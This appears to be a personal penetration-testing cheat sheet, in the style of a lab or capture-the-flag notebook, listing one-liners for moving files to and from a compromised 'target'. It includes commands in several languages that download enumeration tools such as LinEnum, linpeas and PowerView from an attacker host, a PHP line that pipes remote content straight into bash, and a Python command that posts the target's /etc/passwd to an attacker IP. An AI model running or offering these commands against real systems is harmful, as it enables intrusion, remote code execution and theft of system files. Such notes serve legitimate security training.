![[Pasted image 20250608182642.png]]
- [ ] Upload File To The Target
Python!!!!
```python
# python2.7
python2.7 -c 'import urllib;urllib.urlretrieve ("URL", "LinEnum.sh")'
# python3
python3 -c 'import urllib.request;urllib.request.urlretrieve("URL", "LinEnum.sh")'

python3 -c 'import os, http.server; os.makedirs("uploads", exist_ok=True); http.server.test(HandlerClass=type("UploadHandler",(http.server.SimpleHTTPRequestHandler,),{"do_POST":lambda self: (os.makedirs("uploads", exist_ok=True), open(os.path.join("uploads", os.path.basename(self.path.strip("/")) or "upload.bin"), "wb").write(self.rfile.read(int(self.headers["Content-Length"]))), self.send_response(200), self.end_headers(), self.wfile.write(b"File saved!"))}), port=8080)'
```
PHP!!!
```php
php -r '$file = file_get_contents("URL"); file_put_contents("LinEnum.sh",$file);'

php -r 'const BUFFER = 1024; $fremote = fopen("URL", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'

php -r '$lines = @file("URL"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
```
Ruby!!!
```ruby
ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("URL")))'
```
Perl!!!
```perl
perl -e 'use LWP::Simple; getstore("http://10.10.14.9/linpeas.sh", "linpeas.sh");'
```
Cscript!!!!
```powershell
# wget.js
cscript.exe /nologo wget.js URL PowerView.ps1
# wget.vbs
cscript.exe /nologo wget.vbs URL PowerView2.ps1
```

- [ ] Download Files From the Target
Python3!!!!
```sh
# attacker
python3 -m uploadserver 
# target
python3 -c 'import requests;requests.post("http://10.10.14.204:8080/upload",files={"files":open("/etc/passwd","rb")})'
```
